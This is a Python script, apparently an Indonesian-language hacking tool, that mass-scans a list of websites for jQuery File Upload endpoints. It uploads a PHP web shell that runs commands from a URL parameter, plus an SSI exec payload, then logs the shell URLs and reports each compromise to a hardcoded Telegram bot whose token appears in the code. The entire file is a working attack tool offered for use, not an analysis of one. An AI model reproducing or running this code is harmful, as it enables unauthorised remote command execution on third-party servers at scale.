#!/usr/bin/env python3
import requests, os, sys
from urllib.parse import urljoin
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

# ==== KONFIG TELEGRAM (EDIT BAGIAN INI) ====
TELEGRAM_BOT_TOKEN = "7610446917:AAGQHFkACYGeoPd1CmlH0GeqdwJ2qllKq9c"
TELEGRAM_CHAT_ID   = "7973648686"

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True}
        requests.post(url, data=data, timeout=7)
    except Exception as e:
        pass

ENDPOINTS = [
    '/server/php/',
    '/jquery-file-upload/server/php/',
    '/upload/server/php/',
    '/assets/global/plugins/jquery-file-upload/server/php/',
    '/assets/plugins/jquery-file-upload/server/php/',
    '/file-upload/server/php/',
    '/js/upload/server/php/',
    '/plugins/jquery-file-upload/server/php/',
    '/components/com_jqueryfileupload/server/php/',
    '/php/filemanager/server/php/',
]
SHELL_CONTENT = {
    'xtings.txt'  : 'SIMPLE-TEXT-UPLOAD',
    'xtings.shtml': '<!--#exec cmd="id"-->',
    'xtings.php'  : '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}else{phpinfo();} ?>'
}
RESULTS_FILE = "results-jqfileupload.txt"

def exploit(site, no):
    site = site.strip()
    if not site:
        return (no, False, site, None)
    if not site.startswith("http"):
        site = "http://" + site
    if site.endswith("/"):
        site = site[:-1]
    for endpoint in ENDPOINTS:
        url_upload = urljoin(site, endpoint)
        try:
            r = requests.get(url_upload, timeout=8, verify=False)
            if r.status_code not in [200, 405]:
                continue
        except:
            continue
        files_uploaded = {}
        for fname, fcontent in SHELL_CONTENT.items():
            try:
                files = {'files[]': (fname, fcontent, 'application/octet-stream')}
                r = requests.post(url_upload, files=files, timeout=12, verify=False)
                if r.status_code not in [200,201]:
                    continue
                try:
                    j = r.json()
                    fileurl = None
                    if isinstance(j, dict):
                        if "files" in j and len(j["files"]) > 0:
                            fileurl = j["files"][0].get("url")
                        elif "url" in j:
                            fileurl = j["url"]
                    if fileurl and fname in fileurl:
                        files_uploaded[fname] = fileurl
                except:
                    continue
            except:
                continue
        if files_uploaded:
            with open(RESULTS_FILE, "a") as f:
                f.write(f"{site} | {url_upload}\n")
                for k,v in files_uploaded.items():
                    f.write(f"  [shell] {k} : {v}\n")
                f.write("="*33+"\n")
            # ===== NOTIF TELEGRAM LANGSUNG ====
            msg = f"<b>SUKSES:</b> <code>{site}</code>\n"
            for k,v in files_uploaded.items():
                msg += f"  <b>[shell] {k}:</b> <a href='{v}'>{v}</a>\n"
            send_telegram(msg)
            return (no, True, site, files_uploaded)
    return (no, False, site, None)

def main():
    # === Basic anti-edit (bisa diacak pakai pyarmor untuk hardcore) ===
    if not os.path.basename(__file__).startswith('jq') and not os.path.exists('LICENSE'):
        print("Protected script. Don't edit!")
        sys.exit(0)

    print(Fore.CYAN + "==== Mass jQuery File Upload Exploit ====")
    targets_file = input(Fore.CYAN + "Masukkan nama file list TXT (misal: list.txt): ").strip()
    if not os.path.isfile(targets_file):
        print(Fore.RED + f"File {targets_file} tidak ditemukan.")
        sys.exit(1)
    try:
        threads = int(input(Fore.CYAN + "Jumlah worker/thread (misal: 100): ").strip())
        if threads < 1: threads = 10
    except:
        threads = 10

    with open(targets_file) as f:
        targets = [line.strip() for line in f if line.strip()]
    total = len(targets)
    print(Fore.YELLOW + f"Total Target: {total}\nMulai scan...\n")

    sukses, gagal = 0, 0
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit, target, i): i for i, target in enumerate(targets, 1)}
        for future in as_completed(futures):
            no, ok, site, shells = future.result()
            if ok:
                sukses += 1
                print(Fore.GREEN + f"[{no}] SUCCESS: {site}")
                for k,v in (shells or {}).items():
                    print(Fore.CYAN + f"    [shell] {k}: {v}")
            else:
                gagal += 1
                print(Fore.RED + f"[{no}] FAIL: {site}")

    print(Fore.YELLOW + "\n==== DONE ====")
    print(Fore.GREEN  + f"SUKSES: {sukses}")
    print(Fore.RED    + f"GAGAL : {gagal}")
    print(Fore.YELLOW + f"Output File: {RESULTS_FILE}\n")

if __name__ == "__main__":
    main()
